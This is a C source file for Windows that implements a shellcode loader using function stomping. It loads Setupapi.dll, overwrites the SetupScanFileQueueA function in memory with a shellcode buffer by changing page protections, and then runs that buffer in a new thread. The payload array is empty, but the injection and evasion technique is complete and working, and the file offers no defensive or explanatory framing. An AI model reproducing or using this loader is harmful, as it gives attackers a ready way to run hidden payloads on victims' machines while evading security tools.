#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>


#define DLL "Setupapi.dll"
#define sacfunction "SetupScanFileQueueA"

writepayloadtothefunction(PVOID paddress,unsigned char* pshellcode,SIZE_T szpayload) {


	DWORD oldprotection = NULL;
	if(!VirtualProtect((LPVOID)paddress, szpayload, PAGE_READWRITE, &oldprotection) ) {
		printf("virtual protect failed with error no %d\n", GetLastError());
		return FALSE;
	}

	memcpy(paddress, pshellcode, szpayload);

	if (!VirtualProtect((LPVOID)paddress, szpayload, PAGE_EXECUTE_READ, &oldprotection)) {
		printf("virtual protect failed with error no %d\n", GetLastError());
		return FALSE;
	}


}

int main() {


	HMODULE hmodule;

	PVOID address = GetProcAddress(LoadLibraryA(DLL),sacfunction);

	unsigned char shellcode[] = {
		 };

	unsigned char* pshellcode = shellcode;

	SIZE_T szshellcode = sizeof(shellcode);

	if (address == NULL) {
		printf("The getprocaddress failed with error no %d\n", GetLastError());
	}

	printf("The address of sacfunction is 0x%p\n", address);


	writepayloadtothefunction(address, pshellcode, szshellcode);

	printf("press enter to execute the payload");
	getchar();

	CreateThread(NULL, NULL, address, NULL, NULL, NULL);

	printf("press enter to exit;");
	getchar();




}